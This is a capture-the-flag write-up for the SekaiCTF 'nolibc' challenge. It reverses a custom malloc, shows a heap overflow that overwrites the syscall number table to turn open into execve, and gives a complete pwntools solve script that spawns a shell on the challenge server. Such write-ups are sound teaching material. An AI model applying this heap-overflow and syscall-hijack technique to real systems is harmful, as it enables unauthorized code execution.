# sekai ctf
## nolibc
### hint
```
No libc means no vulnerability right?!  
  
Author: Marc  
```
The challenge comes with a binary, and is exploited through a netcat connection
### premise
The challenge is a string data base app: you can register an account, log in, add and delete strings, save the strings to a file, and read the strings in from a file. However, instead of being linked to libc, all the functions are implemented ad-hoc: There are implementations for getch, malloc, free, open, close, puts, and so on.
### interesting parts
The first thing I poked around was how all the IO operations worked. After all, theres a read file function, which could be useful getting the flag (which is stored in a file). Sadly, there is a check in there fore if the file name has "flag" in it, so thats a no go. But, something interesting I saw while reading the assembly for how it actually read the file was this:  
<img src="/resources/syscall_oddity.png"/>  
We're moving a value from RAM to do syscalls. Looking into were this value is, we find this:  
<img src="/resources/syscall_location.png"/>  
going up from this, to find what the 0s are, reveals...  
<img src="/resources/buffer_reveal.png"/>  
which gives us a good place to start looking. If we can overrun the heap, we can overwrite syscalls. To ensure this is a good plan of attack, I looked into the syscalls themselves for a good one. `open` appeared to be usable: it's used in the read/write file functionalities, and it accepts a string we control as it's first argument (%rax). It's other 2 arguments (%rsi and %rdx) were also both set to 0 by the read file function, which means it can be replaced with execve and passed `/bin/sh` to get a shell
### malloc issues
The first thing to note is how it does a lot of things in the "heap": It creates a struct for all the user data, including password, username, and the strings added to the user (up to 2047 or 0x7ff), and of course the strings themselves (and all the buffers to read in the strings). This gives us some idea to look at the malloc and free implementations, and from there we can start finding some odd behavior. Below is the ghidra output for malloc:
```c
ulong * malloc(int size) {
  uint rounded_size;
  int *next_block;
  ulong *last_block;
  ulong *curr_block;
  
  if (size != 0) {
    rounded_size = size + 0xfU & 0xfffffff0;
    last_block = (ulong *)0x0;
    for (curr_block = malloc_head; curr_block != (ulong *)0x0; curr_block = (ulong *)curr_block[1]) {
      if ((int)rounded_size <= *(int *)curr_block) {
        if ((long)(int)rounded_size + 0x10U <= (ulong)(long)*(int *)curr_block) {
          next_block = (int *)((long)curr_block + (long)(int)rounded_size + 0x10);
          *next_block = (*(int *)curr_block - rounded_size) + -0x10;
          *(ulong *)(next_block + 2) = curr_block[1];
          curr_block[1] = (ulong)next_block;
          *(uint *)curr_block = rounded_size;
        }
        if (last_block == (ulong *)0x0) {
          malloc_head = (ulong *)curr_block[1];
        }
        else {
          last_block[1] = curr_block[1];
        }
        return curr_block + 2;
      }
      last_block = curr_block;
    }
  }
  return (ulong *)0x0;
}
```
Lets break down the algorithm:
1. Round the size up to the nearest 0x10
2. Loop through the blocks past the current malloc\_head in the singly linked list of empty blocks
3. If the current blocks size is greater than or equal to the rounded size, we will return a block
4. If the current blocks size is greater than the rounded size + the malloc metadata size, then we need to create a new free block, which we do at the rounded size + 0x10. This block will have a size equal to whatever the current blocks size is, minus the data we allocated and the metadata we need. Set teh size of this block to the rounded size (so we won't do this again if we allocate teh same size and this block is free)
5. Remove the block from the empty block list
6. Return the original block whose size was greater or equal to teh size we wanted to allocate

The problem with this algorithm is that it assumes the only time the rounded size will be equal to the current block size but the rounded size plus the metadata size will be greater than it is if the block has already been used, or if there isn't enough space to make another block. However, if malloc\_head is at the end of the malloc buffer, then the size of it will be 0x10: the size of the block includes metadata, so we can make an allocation 0x10 bytes long and edit past the buffer when creating a string. We know it is possible to fill the malloc buffer: we can wreite 0x7ff strings, each of length 0x100, which is *much* greater than the maximum of 0x10000 that we are given.  

From the previous section, we know this means that we can override syscalls, and open file specifically, which means its time to start writing an exploit.
### the exploit
I drew an explanatory graphic below to describe the final exploit:
```
Goal: Allocate so that the last meta has size 0x10
lets say our malloc buffer looks like

 0x08 0x10 0x18 0x20 0x28 0x30 0x38 0x40 RD   WR   OP
--------------------------------------------------------
|0x40| 0x0|????|????|????|????|????|????| 0x0| 0x1| 0x2|
--------------------------------------------------------

Then allocate 0x20 bytes (0x30 total, including meta)
 0x08 0x10 0x18 0x20 0x28 0x30 0x38 0x40 RD   WR   OP
--------------------------------------------------------
|0x20|0x18|0x41|0x41|0x41|0x41|0x10| 0x0| 0x0| 0x1| 0x2|
--------------------------------------------------------

Then allocate 0x0F bytes (0x1F total, including meta)
This will overwrite the syscalls. So, we make our string `0x00 0x01 0x3b` to overwrite the open syscall
 0x08 0x10 0x18 0x20 0x28 0x30 0x38 0x40 RD   WR   OP
--------------------------------------------------------
|0x20|0x18|0x41|0x41|0x41|0x41|0x0F| 0x0| 0x0| 0x1|0x3b|
--------------------------------------------------------
```
This seems like it will work, but there's one issue: the read file function needs to allocate 0x7fff to work! Luckily, there's a delete string function. I had issues with this just running through in order, so I opted to do it backwords, which I knew would collect them into a continuous block of memory that read file could use. 

The other thing we need to do is find the size we need to allocate. That can be done through GDB, simply run up to the starting point of the heap filling and print the current heap size. This is harder than it sounds because the binary has no debug symbols and is ASLR, and is where I spent a lot of time, but it can be done by disassembling whatever function you're in and comparing it to Ghidra disassembly until you find malloc, and from there getting malloc\_head and it's pointer (or, really, whatever size past malloc\_head that's smallest and has a next pointer of 0).

With that, all the issues from running the exploit are done, so here's the final solve script:
```py
from pwn import *

r = remote("nolibc.chals.sekai.team", 1337, ssl=True)

def clean():
    print(r.recvuntil(b"Choose an option:"));

def get_malloced(str):

    rounded_size = (len(str) + 0xf) & 0xfffffff0
    return rounded_size + 0x10

total_size = 0x0000bf80

r.sendline(b"2")
r.sendline(b"asd")
r.sendline(b"asd")

r.sendline(b"1")
r.sendline(b"asd")
r.sendline(b"asd")
print(r.recvuntil(b"asd!"))

clean()

for i in range(0, total_size - 0x10 - 0x110, 0x110):
    r.sendline(b"1")
    r.sendline(b"255")
    r.sendline(b"a" * 255)
    print(i, hex(total_size - i))
    clean()

rem = ((total_size-0x10) % 0x110) - 0x20
print(rem)

r.sendline(b"1")
r.sendline(str(rem).encode())
r.sendline(b"a" * rem)
clean()

total = 180

r.sendline(b"1")
r.sendline(b"15")
r.sendline(p32(0x0) + p32(0x1) + p32(0x3b) + p32(0x3)[:3])
clean()

for i in range(total, 0, -1):
    r.sendline(b"2")
    r.sendline(str(i).encode())
    clean()

print(rem)
r.interactive()
```